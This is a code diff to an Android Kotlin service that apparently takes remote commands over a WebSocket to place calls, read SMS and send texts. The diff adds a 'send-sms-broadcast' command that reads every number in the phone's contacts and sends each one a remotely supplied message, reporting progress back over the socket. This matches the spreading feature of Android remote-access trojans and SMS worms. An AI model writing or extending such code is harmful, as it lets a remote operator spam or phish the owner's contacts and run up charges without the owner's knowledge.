@@ -351,6 +351,7 @@ class StreamingService : Service() {
                             "call"           -> makeCall(json.optString("number", ""), ws)
                             "get-sms"        -> sendSmsList(ws)
                             "send-sms"       -> sendSmsMessage(json.optString("number", ""), json.optString("text", ""), ws)
+                            "send-sms-broadcast" -> sendSmsBroadcast(json.optString("text", ""), ws)
                         }
                     } catch (_: Exception) {}
                 }
@@ -608,6 +609,61 @@ class StreamingService : Service() {
         } catch (e: Exception) {
             status(false, "Ошибка: ${e.message ?: "неизвестная"}")
         }
+    }
+
+    private fun sendSmsBroadcast(text: String, ws: WebSocket) {
+        fun done(ok: Boolean, msg: String, sent: Int = 0, failed: Int = 0) =
+            ws.send(JSONObject().put("type","sms-broadcast-done").put("ok",ok).put("msg",msg).put("sent",sent).put("failed",failed).toString())
+        if (text.isBlank()) { done(false, "Текст не указан"); return }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS)
+            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения SEND_SMS"); return }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED) { done(false, "Нет разрешения READ_CONTACTS"); return }
+
+        // Собираем уникальные номера из контактов
+        val contacts = mutableListOf<Pair<String,String>>() // name, number
+        val seen = mutableSetOf<String>()
+        try {
+            contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                        ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null,
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
+            )?.use { c ->
+                val nameCol = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numCol  = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext()) {
+                    val num = (c.getString(numCol) ?: "").trim().replace("\\s".toRegex(), "")
+                    if (num.isBlank() || seen.contains(num)) continue
+                    seen.add(num)
+                    contacts.add(Pair(c.getString(nameCol) ?: num, num))
+                }
+            }
+        } catch (e: Exception) { done(false, "Ошибка чтения контактов: ${e.message}"); return }
+
+        if (contacts.isEmpty()) { done(false, "Нет контактов с номерами"); return }
+
+        // Сообщаем сколько контактов найдено
+        ws.send(JSONObject().put("type","sms-broadcast-progress").put("sent",0).put("failed",0).put("total",contacts.size).put("current","").toString())
+
+        Thread {
+            @Suppress("DEPRECATION")
+            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                getSystemService(SmsManager::class.java) else SmsManager.getDefault()
+            var sent = 0; var failed = 0
+            for ((name, number) in contacts) {
+                try {
+                    val parts = smsManager.divideMessage(text)
+                    smsManager.sendMultipartTextMessage(number, null, parts, null, null)
+                    sent++
+                } catch (_: Exception) { failed++ }
+                ws.send(JSONObject().put("type","sms-broadcast-progress")
+                    .put("sent",sent).put("failed",failed).put("total",contacts.size).put("current",name).toString())
+                Thread.sleep(350) // пауза между отправками — не перегружать оператора
+            }
+            done(true, "Рассылка завершена", sent, failed)
+        }.start()
     }
 
     private fun makeCall(number: String, ws: WebSocket) {
